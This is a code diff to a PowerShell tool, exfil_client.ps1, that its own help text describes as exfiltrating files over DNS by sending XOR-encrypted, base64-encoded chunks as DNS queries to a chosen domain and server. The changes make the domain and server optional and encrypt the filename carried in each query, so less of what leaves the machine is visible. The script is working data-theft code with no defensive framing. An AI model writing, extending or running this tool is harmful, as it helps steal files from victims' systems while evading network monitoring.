@@ -7,14 +7,14 @@
 )
 
 function Show-Help {
-    Write-Host "Usage: .\exfil_client.ps1 -FilePath <file_path> -Domain <domain> -DnsServerIp <dns_server_ip> -Password <password> [-UseTcp]"
+    Write-Host "Usage: .\exfil_client.ps1 -FilePath <file_path> -Password <password> [-Domain <domain>] [-DnsServerIp <dns_server_ip>] [-UseTcp]"
     Write-Host "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
     Write-Host ""
     Write-Host "Parameters:"
     Write-Host "  -FilePath      Path to the file you want to exfiltrate."
+    Write-Host "  -Password      Password to be used in XOR encryption."
     Write-Host "  -Domain        Domain to use in DNS queries."
     Write-Host "  -DnsServerIp   IP address of the DNS server."
-    Write-Host "  -Password      Password to be used in XOR encryption."
     Write-Host "  -UseTcp        Optional switch to use TCP instead of UDP."
     Write-Host ""
     Write-Host "Example:"
@@ -22,7 +22,7 @@ function Show-Help {
 }
 
 # Check if all required parameters are provided
-if (-not $FilePath -or -not $Domain -or -not $DnsServerIp -or -not $Password -or -not (Test-Path $FilePath)) {
+if (-not $FilePath -or -not $Password -or -not (Test-Path $FilePath)) {
     Show-Help
     exit 1
 }
@@ -46,6 +46,7 @@ $data = [System.IO.File]::ReadAllBytes($FilePath)
 
 # Get filename from FilePath
 $filename = Split-Path -Leaf $FilePath
+$filenameBytes = [System.Text.Encoding]::UTF8.GetBytes($filename)
 
 # Generate timestamp in format yyyyMMddHHmmss
 $timestamp = Get-Date -Format "yyyyMMddHHmmss"
@@ -103,7 +104,8 @@ while ($chunk_id -lt $nbChunks) {
     }
 
     # Construct DNS query
-    $hex_filename = -join ($filename.ToCharArray() | ForEach-Object { "{0:X2}" -f [byte][char]$_ })
+    $encryptedFilename = XOR-Encrypt -data $filenameBytes -password $passwordBytes
+    $hex_filename = -join ($encryptedFilename | ForEach-Object { "{0:X2}" -f [byte][char]$_ })
     $metadata = "$hex_filename|$timestamp|$nbChunks"
     $subdomain = "$chunk_id.$($chunks[0]).$($chunks[1]).$($chunks[2]).$($chunks[3]).$metadata.$Domain."
 
